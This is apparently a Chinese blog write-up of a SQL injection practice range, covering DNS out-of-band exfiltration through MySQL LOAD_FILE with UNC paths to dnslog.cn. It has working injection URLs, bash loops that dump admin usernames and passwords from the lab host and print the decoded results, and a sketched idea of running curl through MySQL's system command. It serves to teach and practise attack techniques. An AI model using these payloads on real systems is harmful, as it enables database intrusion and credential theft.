---
date: "2020-12-10T00:00:00Z"
description: 掌控安全 SQL 注入靶场练习 - Dnslog 带外测试
keywords: SQL注入, DNS
tags:
- 安全
- SQL注入
title: 掌控安全 SQL 注入靶场练习 - Dnslog 带外测试
---

# 掌控安全 SQL 注入靶场练习 - Dnslog 带外测试

###  dnslog 带外实现

1. 依赖 `UNC` ， 因此只能在 Windows 下利用
2. 利用 DNS 记录不存在时向上查询的工作模式实现带外攻击
3. 不支持 `load_file('http://host:port/1.txt')` 模式， 否则用不着 dns 了。

### OOB 带外中心思想

1. 将本地数据 `select ... `
2. 通过触发器 `load_file( ... )` 
3. 将结果传递到外部（含文件）`xx.dnslog.cn` 

## 0x00 先说结论

### 0x00.1 dnslog

1. 结果只会缓存 **10** 个， 超过 10 个将被轮训掉。
2. 两个请求接口， 使用 `--cookie PHPSESSID=$md5sha` 关联
    + 获取域名: `http://dnslog.cn/getdomain.php`
    + 获取结果: `http://dnslog.cn/getrecords.php`
3. 返回结果是一个 `[][]string` 的结构， 不能直接被 `golang json unmarshal`, 需要额外构造一下
    + `[["9ilzri.dnslog.cn","58.217.249.149","2020-12-10 23:50:32"]]`
4. 有长度限制， 具体多长没探究。 `hex()` 之后过长， 可能导致无结果。

### 0x00.2 MySQL NULL

> **记住一点** `NULL` 是黑洞，任何与 `NULL` 组合的结果都是 `NULL` 。

```sql
mysql> select length(NULL);
-- |         NULL |
mysql> select hex(NULL);
-- | NULL      |
mysql> select concat(NULL,'.123123');
-- | concat(NULL,'.123123') |
```

### 0x00.3 MySQL 自查询与函数

> 不太好总结

1. `concat()` 返回的已经是一个字符串了， 因此，不需要在外层再加一次 **单引号** 。
2. `load_file(str)` 可以不需要与 `select` 互用执行。
3. 使用 `select` 查询结果， 记得在外层加括号， 构建自查询 `(select ...)`
4. **括号** 太多， 注意闭合



## 0x01 探测注入点

探测是否存在 SQL 注入漏洞。 
虽然说肯定有， 但是还是多写一下 `UNION` 语句。

```bash
http://vulhub.example.com:8022/dns/?id=1%20and%201=2%20union%20select%201,2

## 位置为 2 
```


## 0x02 Web渗透， 从入门到放弃

+ 工具网站: http://dnslog.cn/
+ 工具插件: [chrome extension: hackbar](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?utm_source=chrome-ntp-icon)


### 0x02.1 测试是否可以利用 dnslog 并获取当前库名

**首先来构建语句**

```sql
-- dbname
select database();

-- concat
select CONCAT('//', database(), '.719da4.dnslog.cn/1.txt') ;

-- load_file
SELECT LOAD_FILE(CONCAT('//', database(), '.719da4.dnslog.cn/1.txt')) ;
```

**执行漏洞利用**

```bash
http://vulhub.example.com:8022/dns/?id=1 AND LOAD_FILE(CONCAT('//', database(), '.pewhvo.dnslog.cn/1.txt'))

# maoshe.pewhvo.dnslog.cn
```

### 0x02.2 误入歧途

为什么这么说呢，因为之前在 *封神台* 上做了几个 **错误注入** 和 **盲注** 的靶场。
重点来了: **错误注入 和 盲注** 的靶场 FLAG 都是单独放了一张表的，都叫 **xx`flag`**。
那还不手到擒来， 于是在悲剧开始了 ... 

**构造语句**
```sql
-- 查询有多少 column 包含 flag
select count(*) from information_schema.columns where column_name like '%flag%' ;

-- concat
select concat('//',(select count(*) from information_schema.columns where column_name like '%flag%'),'.w24iu8.dnslog.cn/1.txt')  ;

-- load_file
select load_file( concat('//',(select count(*) from information_schema.columns where column_name like '%flag%'),'.w24iu8.dnslog.cn/1.txt') )  ;

```

**dnslog oob**

```bash
http://vulhub.example.com:8022/dns/?id=1 AND load_file( concat('//',(select count(*) from information_schema.columns where column_name like '%flag%'),'.w24iu8.dnslog.cn/1.txt') ) 

# 8.w24iu8.dnslog.cn
```

WEB 渗透公共小作坊就开始了。 无数个语句平凑， 无数次失落与心酸。
不知道多久过去了， 反正一个天真的孩子在歧路上越走越远
不行了， 太变态了， 第一节就搞这么复杂。

### 0x02.3 是不是我想的太复杂了

按照道理说， 第一节不应该这么复杂啊。 要不就在本地库上找找？

### 0x02.3.1 原始文明到农耕文明

由于靶场没有鉴权， 因此开始使用 `shell script` 进行半手工操作。

```bash
#!/bin/bash

DNSLOG=".maoshe-admin.xxx.dnslog.cn"
SQL=" SELECT SQL STATEMENT "

curl ${SESSION} -sL  "http://vulhub.example.com:8022/dns/?id=1 AND LOAD_FILE(CONCAT('//',( ${SQL}  ),'${DNSLOG}/1.txt')) " > /dev/null
```

**1. 查询表明**

```sql
-- 查询 库名与表明
select hex(group_concat(table_name)) from information_schema.tables  ;
-- 61646d696e2c6e657773.jnwdsn.dnslog.cn
-- => admin,news
```

**2. 查询字段**

```sql
-- 查询字段命令
select hex(group_concat(column_name)) from information_schema.columns where table_schema='maoshe' and table_name='admin';

-- id,username,password
```

**3. 查询账户密码**

1. 这里同时查询两个字段，这里使用 `concat` 而不是 `group_concat`
2. `hex()` 16禁止编码可能会操作 dnslog 的长度限制导致无法拿到结果。

```sql
-- 查询账户密码
select hex(concat(username,'___',password)) from maoshe.admin limit 1,1 ;
-- => admin123___123admin
-- => test___test123
```

**变态啊， 居然还不行** ， 这题 **刁钻， 太刁钻了**

> 是的，没错。 **不知道什么原因，我只执行了 2 次** 。 这就是一切 **惨案** 的源头。


### 0x02.3.2 蒸汽时代，甩开膀子干

使用 **Chrome 开发者工具** 分析了一下 DNSLOG 的请求规则。 升级了工具。

1. 每次请求申请一个域名是因为受过的伤太多。
2. 要 `sleep 1` 是怕被封。

```bash
#!/bin/bash
#

for i in $(seq 0 33)
do
{
    # 生成 dnslog 域名
    md5sha=$(date | md5)
    SESSION="--cookie PHPSESSID=$md5sha"
    DOMAIN=$(curl -s ${SESSION} http://dnslog.cn/getdomain.php )

    DNSLOG=".${i}.${DOMAIN}"

    SQL=" YOUR SQL STATMENT "

    curl ${SESSION} -sL  "http://vulhub.example.com:8022/dns/?id=1 AND LOAD_FILE(CONCAT('//',( ${SQL}  ),'${DNSLOG}/1.txt')) " > /dev/null

    # 获取结果
    curl -sL ${SESSION}  http://dnslog.cn/getrecords.php  | jq '.[0][0]'

    sleep 1
}
done
```

> 不知不觉就开始开始拖库咯。 研究 **布尔盲注** 的时候，把语句都撸了一遍。 
>> [查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句](https://tangx.in/2020/12/09/select-dbms-schema-table-column-names/)


### 0x03 事情总归还是要一个结果

```bash
#!/bin/bash
#

for i in $(seq 0 33)
do
{
    # 生成 dnslog 域名
    md5sha=$(date | md5)
    SESSION="--cookie PHPSESSID=$md5sha"
    DOMAIN=$(curl -s ${SESSION} http://dnslog.cn/getdomain.php )
    DNSLOG=".${i}.${DOMAIN}"

    # 构造 SQL 语句
    SQL=" select hex(concat(username,'___',password)) from maoshe.admin limit ${i},1 "

    # 利用
    curl ${SESSION} -sL  "http://vulhub.example.com:8022/dns/?id=1 AND LOAD_FILE(CONCAT('//',( ${SQL}  ),'${DNSLOG}/1.txt')) " > /dev/null

    # DNSLOG 获取结果
    curl -sL ${SESSION}  http://dnslog.cn/getrecords.php  | jq '.[0][0]'
    
    sleep 1
}
done

# "61646d696e3132335f5f5f31323361646d696e.0.jcjikx.dnslog.cn"
# "746573745f5f5f74657374313233.1.w4n5xa.dnslog.cn"
# "666c61675f5f5f466c61472d626975626975.2.ugvzim.dnslog.cn"

```

## 0x04 Linux 的 MySQL 带外探究

因为在 **mysql 命令行** 能执行以下语句。

> select 1=1 ; system ls ;

因此想在 linux 下也测试 OOB 带外。

### 设想如下

```sql
select 'curl http://host:port/:dbname/:tablename/1,2,3,4' INTO OUTFILE '/var/lib/mysql-files/1.txt'
system bash /var/lib/mysql-files/1.txt
```

而事实上，由于 `JDBC` 与 `ORM` 的存在， 应该不可能实现这种方式带外方式。 而且我都能执行 `bash` 了， 反弹不更方便 ？

> 虽然没实现，作为一种尝试和想法也算好的。

**当时的顿悟** 

> 1. **注意** : 连接 mysql 语句的 **除了`关键字(AND / OR / UNION)` 之外** ， 还有 **结束符号 `分号` `;`**

> 2. **重要思想**, 不要有 **定势思维误区** 



## 0xGG 参考文章

+ [MySQL SELECT INTO Variable](https://www.mysqltutorial.org/mysql-select-into-variable/)
+ [MySQL 使用 SELECT 查询系统变量](https://dev.mysql.com/doc/refman/8.0/en/show-variables.html)
+ [MysQL 使用 INTO OUTFILE 存储位置](https://stackoverflow.com/questions/31558625/sql-into-outfile-where-is-the-file-stored-mysql-windows)
+ [MySQL hex and unhex](https://blog.csdn.net/aeolus_pu/article/details/7766638)
+ [MySQL 使用 system 命令提权限](https://www.cnblogs.com/KevinGeorge/p/8394545.html)
+ [MySQL 查询系统表](https://stackoverflow.com/questions/21171581/querying-system-data-in-mysql)

+ [mysql-dnslog注入 - 应用环境](https://blog.csdn.net/Adminxe/article/details/105926975)
+ [Dnslog在SQL注入中的实战 - 实现原理](https://www.anquanke.com/post/id/98096)

### 0xGG.1 dnslog.cn golang sdk

捎带手， 搞了一个 golang 的 sdk 

+ [dnslogcn-sdk](https://github.com/tangx/dnslogcn-sdk)

